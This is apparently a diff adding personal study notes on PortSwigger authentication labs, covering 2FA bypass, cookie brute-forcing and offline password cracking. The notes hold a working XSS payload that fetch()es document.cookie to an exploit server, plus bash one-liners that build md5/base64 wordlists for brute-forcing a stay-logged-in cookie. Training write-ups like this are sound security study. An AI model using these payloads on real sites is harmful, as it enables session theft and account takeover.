@@ -296,4 +296,180 @@ but not `end-to-end` encrypted.
 And the SIM swapping is done by stealing you phone number for use, by means of social engineering or other methods. 
 And thus the attacker can receive the SMS messages.
 
-https://portswigger.net/web-security/learning-paths/authentication-vulnerabilities/vulnerabilities-in-multi-factor-authentication/authentication/multi-factor/bypassing-two-factor-authentication
+#### Bypassing two-factor authentication
+
+In some cases 2FA implementation can be so flawed, that it can be bypassed entirely.
+
+If the user is prompted to enter their password and then prompted to enter a verification code on a separate page.
+The user is effectively in a `logged in state` before they have entered the verification code.
+
+In this instance it's worth checking if you can directly `skip` onto the `logged in only pages` after the first authentication step.
+
+Sometimes websites do not check if the second step has been completed.
+
+**LAB**: 2FA simple bypass
+
+**Solution**: This lab demonstrates the first bypass example.
+We log in with out credentials, and enter the 2FA code from our email.
+We can access our profile page at `/my-account?id=wiener`.
+
+So using targets credentials we log in with creds, ignore the 2FA and head straight to.
+`/my-account?id=carlos` and there you go.
+
+#### Flawed two-factor verification logic
+
+In some webapps the target username for 2FA login is set in a `cookie`.
+Meaning if we alter the cookies username and manage to brute-force the verification code.
+We can takeover the account of any user.
+
+For example:
+
+1. Login with creds as usual.
+```http
+POST /login-steps/first HTTP/1.1
+Host: vulnerable-website.com
+
+username=carlos&password=qwerty
+```
+
+2. The cookie is assigned to your account, then the second factor authentication begins.
+```http
+HTTP/1.1 200 OK
+Set-Cookie: account=carlos
+
+GET /login-steps/second HTTP/1.1
+Cookie: account=carlos
+```
+
+3. When submitting the verification code, the target account is determined by the cookie value.
+```http
+POST /login-steps/second HTTP/1.1
+Host: vulnerable-website.com
+Cookie: account=carlos
+
+verification-code=123456
+```
+
+So the attacker can just change the cookie value to a target account.
+
+**LAB**: 2FA broken logic
+
+**Solution**: First to get the requests I log in as my user and enter the 2FA code from email.
+We modify requests to have:
+`Cookie: verify=carlos; session=redacted`
+Username set as our target.
+Perform one get request to generate the code.
+And then run the four digit brute-force attack.
+In this lab specifically the first digit in the code always ends up as 0/1 which saves our brute-force requests to maximum 2000 requests.
+
+#### Brute-forcing 2FA verification codes
+
+As we demonstrated in the previous lab, `rate limiting` the 2FA verification code endpoint is important.
+Because `cracking` the `4-6 digit code` is `trivial`.
+
+Some webapps log you out if you spam the code attempts, but that's insufficient because logging back in can be automated and this defense is rendered useless.
+
+#### Vulnerabilities in other authentication mechanisms
+
+Most websites these days have a way to `change password or reset it` in case you forgot it.
+It is possible that the hardening of login pages does `not equal` to same `level of protection` for other functionalities for authentication.
+
+#### Keeping users logged in
+
+Commonly, websites allow you to stay logged in even after you close the browser/session.
+This is usually done by generating `cookies/tokens`.
+
+As cookies best practices suggest in general, these `values` should be `hard to guess` for security.
+But in some cases, these values consist of static values or timestamps.
+
+Therefore it can be dangerous if a user has access to their cookie.
+It can be `reverse engineered` and used for brute-force attacks.
+
+Also, do not assume that `encrypting static values` for a cookie is secure.
+In some cases, cookie is encoded in base64 which is a sin for security.
+
+The attacker could find a way to `identify the hashing algorithm` and attempt a `brute-force attack` to crack it.
+Opensource frameworks have documentation on how their cookies are constructed which could lead to bypassing that encryption defense.
+Or in other cases, using `XSS` to steal another users cookie to do try and reconstruct it.
+
+This all relates to `remember me` cookies/tokens.
+
+---
+
+**LAB**: Brute-forcing a stay-logged-in cookie
+
+**Solution**: This web app has a feature `remember me` when logging in.
+We exploit this functionality by dissecting the cookie it value it creates.
+
+`Cookie: stay-logged-in=Y2FybG9zOmRmNTNjYTI2ODI0MGNhNzY2NzBjODU2NmVlNTQ1Njhh; session=redacted`
+
+As you can see we have stay-logged-in cookie, this value can be base64 decoded into a `username:md5_hashed_password`.
+We see our username in plain text, and some cryptic string, we can use `hash-identifier` python script or use an online tool.
+It returns and MD5 hashing algorithm, which is not up to standard and is likely to have large database of it's cracked passwords (rainbow tables as well).
+
+For ease of use, we visit crackstation.net and crack our own password "peter".
+We can validate that this cookie can be brute-forced by spamming the server with requests and if don't get stopped somehow, we are in luck.
+
+We can omit the  value of the second cookie to not interfere with testing, the session cookie value, as such `session=`.
+To automate this process, we will need to prepare our wordlist.
+First each password will need to be md5 hashes.
+```bash
+└─$ while read -r line; do echo -n "$line" | md5sum >> "wordlist_md5.txt" ; done < "wordlist.txt"
+```
+It's important to do `echo -n`, it does not do a trailing newline which could interfere with our hashing or encoding, thus rendering this whole ordeal useless.
+Now we need to add the username we are brute-forcing for, `carlos`, and prepend it to a hashed password `carlos:2ub3uko8bb2doasdfDSBfxoi`.
+This can be done however, bash, python, I choose to do it in `vim` because it was easiest and fastest for me.
+Now we repeat the command, but with `base64` instead of `md5sum`, and make the respective filenames updated.
+```bash
+└─$ while read -r line; do echo -n "$line" | base64 >> "wordlist_final.txt" ; done < "wordlist_md5.txt"
+```
+
+Now we should have our wordlist with each line containing hashed password with plaintext "username:" and all that base64 encoded.
+Next, simply run the intruder type attack on URL /account. And observe the for different response.
+
+---
+
+*Note:* In some insane instances, you might find passwords in plaintext stored in cookies.
+Or more commonly you will find hashed passwords.
+If the password is found in wordlists, aka it's easy to crack then we can use `hashcat` to crack it using a big wordlist and a CUDA accelerated GPU.
+If the password is particularly weak, it can be found by online searching, and of course this attack only works if the password appears in the wordlist.
+
+This demonstrates the importance of `salt` in hashing passwords and things in general.
+
+---
+
+**LAB**: Offline password cracking
+Takeover `carlos` account by stealing his `stay-logged-in` cookie via `XSS` vulnerability in the comment section, `crack the password` offline and login as him.
+
+**Solution**: this is my favorite lab so far, the most fun.
+Chaining two vulnerabilities and then playing with ciphers and encodings, XSS cookie exfiltration with exploit server, shieet.
+https://portswigger.net/web-security/learning-paths/authentication-vulnerabilities/vulnerabilities-in-other-authentication-mechanisms/authentication/other-mechanisms/lab-offline-password-cracking#
+
+We find the and validate the XSS vulnerability in the comment section.
+The comment filed itself is vulnerable, and we can validate with this payload. `</p><img src=x onerror=alert(1)>`
+The alert triggers, and the cookies have `http-only` flag set as false, so we can send the cookie cross domains.
+
+Now let's craft a payload that will exfil the cookie to us.
+There is numerous ways to do this, but since we only see HTTP request log for our exploit server without POST data, we will do as follows.
+(We could've done a whole JS script on exploit server but both will do the job).
+```html
+</p><img src=x onerror="fetch('https://exploit-server.net/exploit?x='+btoa(document.cookie))">
+```
+```js
+fetch('https://exploit-server.net/exploit?x=' + btoa(document.cookie))
+```
+
+So the `onerror` event attribute will run when the image loading fails, and it will as soon as the page loads because it's source is set to 'x'.
+The JS that will run, is a `fetch` function for HTTP requests, and we send a GET request to our exploit server, with a `?x=` parameter that will have a value of base64 encoded cookie of the user who visited the page.
+The reason for base64 encoding is for easier data transport.
+
+Server log... request with the cookie.
+```js
+GET /exploit?x=c2VjcmV0PXV4eEwzam1HbHloRk9VZDlLQTJXS2ZKOTZVMGxUNWFWOyBzdGF5LWxvZ2dlZC1pbj1ZMkZ5Ykc5ek9qSTJNekl6WXpFMlpEVm1OR1JoWW1abU0ySmlNVE0yWmpJME5qQmhPVFF6
+```
+
+When inspecting the received cookie we see the username `carlos:asdb83bBDS9bsd` and md5 hashed password, which is cracked easily because it's a weak password (crackstation.net)
+`carlos:onceuponatime`
+Delete the user to solve the lab.
+
+---
